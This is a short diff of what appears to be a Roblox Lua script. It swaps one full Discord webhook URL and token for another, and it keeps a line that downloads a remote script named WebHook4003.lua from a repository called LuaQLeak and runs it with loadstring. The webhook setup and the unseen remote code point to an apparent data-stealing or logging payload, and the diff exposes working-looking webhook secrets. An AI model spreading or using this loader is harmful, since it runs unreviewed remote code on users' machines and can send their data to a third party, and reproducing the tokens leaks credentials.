@@ -1,4 +1,4 @@
-getgenv().WebhookHere = "https://discord.com/api/webhooks/1047865411724656731/E5gNYnBYY4s1KYqGU-T9CdqIzERuDbas_uh0qL6SZbpep7K6lzBYdUxlW8spaW6JSO1Y"
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1058764632967360602/CKTr6R1oPvVf3Ls2iFdHWBoHO8Y2GtoaDT3_LN0Z9y6TxI3A-hnR2NZGU5qD9V_IsVT5"
  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
